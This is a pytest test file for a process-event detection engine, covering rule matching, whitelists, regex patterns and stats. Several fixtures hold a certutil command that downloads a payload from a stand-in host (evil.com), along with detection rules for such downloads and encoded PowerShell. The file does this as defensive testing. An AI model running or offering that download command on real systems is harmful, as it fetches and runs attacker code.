"""
Tests for detection engine
"""
import pytest
from datetime import datetime
from core.engine import DetectionEngine, Alert
from core.rule_loader import Rule
from collectors.base import Event


def test_alert_creation():
    """Test Alert dataclass creation"""
    event = Event(
        timestamp=datetime(2025, 1, 1, 12, 0, 0),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        user="baduser",
        process_id=1234
    )

    alert = Alert(
        rule_id="WIN-001",
        rule_name="Test Rule",
        severity="high",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1105"],
        description="Test description",
        response=["Test response"]
    )

    assert alert.rule_id == "WIN-001"
    assert alert.severity == "high"
    assert alert.event.process_name == "certutil.exe"


def test_alert_to_dict():
    """Test Alert serialization to dictionary"""
    event = Event(
        timestamp=datetime(2025, 1, 1, 12, 0, 0),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        user="testuser",
        process_id=5678
    )

    alert = Alert(
        rule_id="WIN-002",
        rule_name="Test Rule",
        severity="medium",
        event=event,
        timestamp=event.timestamp,
        mitre_attack=["T1059"],
        description="Test",
        response=["Action 1"]
    )

    result = alert.to_dict()

    assert result['rule_id'] == "WIN-002"
    assert result['severity'] == "medium"
    assert 'event' in result
    assert result['event']['process_name'] == "cmd.exe"
    assert 'timestamp' in result


def test_engine_initialization():
    """Test DetectionEngine initializes with rules"""
    rule_dict = {
        'name': 'Test',
        'id': 'WIN-999',
        'platform': 'windows',
        'severity': 'low',
        'detection': {'process_name': 'test.exe'}
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    assert len(engine.rules) == 1
    assert engine.rules[0].id == 'WIN-999'


def test_basic_rule_matching():
    """Test basic event matches rule with process_name and command_contains"""
    rule_dict = {
        'name': 'Certutil Download',
        'id': 'WIN-001',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'certutil.exe',
            'command_contains': ['-urlcache', 'http']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event that matches
    event = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache -split -f http://evil.com/payload.exe",
        user="baduser",
        process_id=1234
    )

    alerts = engine.match_event(event)

    assert len(alerts) == 1
    assert alerts[0].rule_id == 'WIN-001'
    assert alerts[0].severity == 'high'


def test_rule_no_match_wrong_process():
    """Test event doesn't match when process name is different"""
    rule_dict = {
        'name': 'Certutil Download',
        'id': 'WIN-001',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'certutil.exe',
            'command_contains': ['-urlcache', 'http']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with different process name
    event = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="powershell.exe",
        command_line="powershell.exe -urlcache http://test.com",
        user="user",
        process_id=1234
    )

    alerts = engine.match_event(event)

    assert len(alerts) == 0


def test_command_contains_and_logic():
    """Test that ALL items in command_contains must match (AND logic)"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-002',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {
            'process_name': 'cmd.exe',
            'command_contains': ['word1', 'word2', 'word3']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event missing one word - should NOT match
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe word1 word2",
        user="user",
        process_id=1234
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 0

    # Event with all words - should match
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe word1 word2 word3",
        user="user",
        process_id=5678
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 1


def test_whitelist_by_user():
    """Test whitelisting filters out events by user"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-003',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'certutil.exe',
            'command_contains': ['-urlcache']
        },
        'whitelist': {
            'users': ['SYSTEM', 'Administrator']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event from whitelisted user - should NOT alert
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache http://test.com",
        user="SYSTEM",
        process_id=1234
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 0

    # Event from non-whitelisted user - should alert
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -urlcache http://test.com",
        user="baduser",
        process_id=5678
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 1


def test_whitelist_by_parent_process():
    """Test whitelisting filters out events by parent process"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-004',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'certutil.exe'
        },
        'whitelist': {
            'parent_processes': ['msiexec.exe', 'sccm.exe']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with whitelisted parent - should NOT alert
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -verify cert.cer",
        user="user",
        process_id=1234,
        parent_process_name="msiexec.exe"
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 0

    # Event without whitelisted parent - should alert
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="certutil.exe",
        command_line="certutil.exe -verify cert.cer",
        user="user",
        process_id=5678,
        parent_process_name="cmd.exe"
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 1


def test_whitelist_by_path():
    """Test whitelisting filters out events by working directory path"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-005',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {
            'process_name': 'powershell.exe'
        },
        'whitelist': {
            'paths': ['C:\\Program Files\\', 'C:\\Windows\\System32\\']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event from whitelisted path - should NOT alert
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="powershell.exe",
        command_line="powershell.exe -Command Get-Process",
        user="user",
        process_id=1234,
        working_directory="C:\\Program Files\\MyApp"
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 0

    # Event from non-whitelisted path - should alert
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="powershell.exe",
        command_line="powershell.exe -Command Get-Process",
        user="user",
        process_id=5678,
        working_directory="C:\\Users\\baduser\\Downloads"
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 1


def test_multiple_rules_match_one_event():
    """Test that a single event can match multiple rules"""
    rule1_dict = {
        'name': 'PowerShell Execution',
        'id': 'WIN-010',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {
            'process_name': 'powershell.exe'
        }
    }

    rule2_dict = {
        'name': 'PowerShell Encoded Command',
        'id': 'WIN-011',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'powershell.exe',
            'command_contains': ['-encodedcommand']
        }
    }

    rule1 = Rule(rule1_dict)
    rule2 = Rule(rule2_dict)
    engine = DetectionEngine([rule1, rule2])

    # Event that matches both rules
    event = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="powershell.exe",
        command_line="powershell.exe -encodedcommand ZQBjaABvACAAIgBoAGUAbABsAG8AIgA=",
        user="user",
        process_id=1234
    )

    alerts = engine.match_event(event)

    assert len(alerts) == 2
    assert {alert.rule_id for alert in alerts} == {'WIN-010', 'WIN-011'}


def test_platform_filtering():
    """Test that rules only match events from same platform"""
    rule_dict = {
        'name': 'Windows Rule',
        'id': 'WIN-020',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'cmd.exe'
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Linux event - should NOT match Windows rule
    event = Event(
        timestamp=datetime.now(),
        platform="linux",
        process_name="cmd.exe",
        command_line="/usr/bin/cmd.exe",
        user="user",
        process_id=1234
    )

    alerts = engine.match_event(event)
    assert len(alerts) == 0


def test_empty_rules_list():
    """Test engine with empty rules list"""
    engine = DetectionEngine([])

    event = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="anything.exe",
        command_line="anything",
        user="user",
        process_id=1234
    )

    alerts = engine.match_event(event)
    assert len(alerts) == 0


def test_match_multiple_events():
    """Test matching multiple events at once"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-030',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'certutil.exe'
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    events = [
        Event(
            timestamp=datetime.now(),
            platform="windows",
            process_name="certutil.exe",
            command_line="certutil.exe -urlcache http://test1.com",
            user="user1",
            process_id=1234
        ),
        Event(
            timestamp=datetime.now(),
            platform="windows",
            process_name="powershell.exe",
            command_line="powershell.exe -Command test",
            user="user2",
            process_id=5678
        ),
        Event(
            timestamp=datetime.now(),
            platform="windows",
            process_name="certutil.exe",
            command_line="certutil.exe -decode file.txt",
            user="user3",
            process_id=9012
        )
    ]

    alerts = engine.match_events(events)

    # Should generate 2 alerts (2 certutil events)
    assert len(alerts) == 2
    assert all(alert.rule_id == 'WIN-030' for alert in alerts)


def test_command_regex_matching():
    """Test command_regex detection pattern"""
    rule_dict = {
        'name': 'IP Address in Command',
        'id': 'WIN-040',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {
            'process_name': 'cmd.exe',
            'command_regex': r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with IP address - should match
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c ping 192.168.1.1",
        user="user",
        process_id=1234
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 1

    # Event without IP address - should NOT match
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        user="user",
        process_id=5678
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 0


def test_parent_process_detection():
    """Test parent_process detection pattern"""
    rule_dict = {
        'name': 'Suspicious Parent Process',
        'id': 'WIN-050',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'cmd.exe',
            'parent_process': 'winword.exe'
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with matching parent - should match
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        user="user",
        process_id=1234,
        parent_process_name="winword.exe"
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 1

    # Event without parent process - should NOT match
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        user="user",
        process_id=5678,
        parent_process_name=None
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 0


def test_case_insensitive_matching():
    """Test that matching is case-insensitive"""
    rule_dict = {
        'name': 'Test Rule',
        'id': 'WIN-060',
        'platform': 'windows',
        'severity': 'medium',
        'detection': {
            'process_name': 'CMD.EXE',
            'command_contains': ['WHOAMI']
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with different case - should still match
    event = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c whoami",
        user="user",
        process_id=1234
    )

    alerts = engine.match_event(event)
    assert len(alerts) == 1


def test_engine_stats():
    """Test get_stats returns correct information"""
    rules = [
        Rule({
            'name': 'Rule 1',
            'id': 'WIN-100',
            'platform': 'windows',
            'severity': 'high',
            'detection': {'process_name': 'test.exe'}
        }),
        Rule({
            'name': 'Rule 2',
            'id': 'WIN-101',
            'platform': 'windows',
            'severity': 'medium',
            'detection': {'process_name': 'test2.exe'}
        }),
        Rule({
            'name': 'Rule 3',
            'id': 'LNX-001',
            'platform': 'linux',
            'severity': 'high',
            'detection': {'process_name': 'bash'}
        })
    ]

    engine = DetectionEngine(rules)
    stats = engine.get_stats()

    assert stats['total_rules'] == 3
    assert stats['by_severity']['high'] == 2
    assert stats['by_severity']['medium'] == 1
    assert stats['by_platform']['windows'] == 2
    assert stats['by_platform']['linux'] == 1


def test_user_pattern_detection():
    """Test user_pattern detection using regex"""
    rule_dict = {
        'name': 'Admin User Activity',
        'id': 'WIN-070',
        'platform': 'windows',
        'severity': 'high',
        'detection': {
            'process_name': 'cmd.exe',
            'user_pattern': r'^admin'
        }
    }

    rule = Rule(rule_dict)
    engine = DetectionEngine([rule])

    # Event with matching user pattern - should match
    event1 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        user="administrator",
        process_id=1234
    )

    alerts1 = engine.match_event(event1)
    assert len(alerts1) == 1

    # Event without matching user pattern - should NOT match
    event2 = Event(
        timestamp=datetime.now(),
        platform="windows",
        process_name="cmd.exe",
        command_line="cmd.exe /c dir",
        user="normaluser",
        process_id=5678
    )

    alerts2 = engine.match_event(event2)
    assert len(alerts2) == 0
